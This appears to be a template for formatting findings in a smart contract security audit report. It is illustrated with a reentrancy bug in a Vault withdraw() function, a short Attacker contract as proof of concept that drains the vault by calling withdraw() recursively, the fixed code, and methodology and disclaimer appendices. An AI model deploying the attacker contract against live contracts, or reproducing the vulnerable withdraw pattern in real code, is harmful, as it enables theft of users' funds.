## Finding Format

```markdown
## [H-01] Title Describing the Vulnerability

### Severity
**High**

### Location
`src/Vault.sol:142-156`

### Description
[Clear explanation of the vulnerability, what's wrong, and why it matters]

The `withdraw()` function sends ETH to the user before updating their balance,
creating a reentrancy vulnerability:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    
    (bool success,) = msg.sender.call{value: amount}("");  // External call
    require(success, "Transfer failed");
    
    balances[msg.sender] -= amount;  // State update AFTER call
}
```

### Impact
An attacker can drain all ETH from the contract by recursively calling
`withdraw()` before the balance is updated.

**Funds at Risk:** All ETH in contract (~$X at time of audit)

### Proof of Concept

```solidity
contract Attacker {
    Vault vault;
    
    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}
```

### Recommendation

Apply the Checks-Effects-Interactions (CEI) pattern:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    
    balances[msg.sender] -= amount;  // State update BEFORE call
    
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

Alternatively, use OpenZeppelin's `ReentrancyGuard`.

## Appendix Sections

```markdown
## Appendix A: Methodology

This audit followed a structured approach:
1. **Reconnaissance:** Architecture mapping, entry point identification
2. **Static Analysis:** Slither, compiler warnings
3. **Manual Review:** Line-by-line review against checklist
4. **Testing:** Foundry tests for findings

## Appendix B: Tools Used

- Slither v0.10.0
- Foundry (forge 0.2.0)
- VS Code with Solidity extensions

## Appendix C: Scope Verification

All in-scope contracts were reviewed. The following were explicitly excluded:
- [List excluded items]

## Appendix D: Disclaimer

This audit does not guarantee the absence of vulnerabilities. Smart contract
security is a continuous process, and we recommend ongoing security practices
including bug bounties, monitoring, and incident response planning.
